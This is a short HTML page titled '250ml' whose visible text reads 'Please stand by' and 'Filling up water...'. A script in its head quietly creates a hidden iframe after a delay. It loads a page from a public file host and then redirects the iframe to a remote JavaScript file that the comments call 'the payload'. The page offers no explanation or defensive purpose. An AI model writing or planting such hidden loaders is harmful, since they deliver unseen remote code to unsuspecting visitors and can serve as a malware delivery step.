<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>250ml</title>
  <link rel="stylesheet" href="style250.css" />
  <script>
  setTimeout(() => {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';

    // Loads a generic HTML page
    iframe.src = 'https://files.catbox.moe/7cwlbl.html';

    iframe.onload = () => {
      // Redirects to the payload
      iframe.contentWindow.location.href = 'https://files.catbox.moe/cwedrd.js';
      document.getElementById("status").textContent = "Payload rerouted via iframe hatch.";
    };

    iframe.onerror = () => {
      document.getElementById("status").textContent = "Iframe navigation failed!";
    };

    document.body.appendChild(iframe);
  }, 1500);
</script>
</head>
<body>
  <div class="container">
    <h1>Please stand by.</h1>
    <p class="note">Spilling 250ml...</p>
    <pre id="status">Filling up water...</pre>
  </div>
</body>
</html>
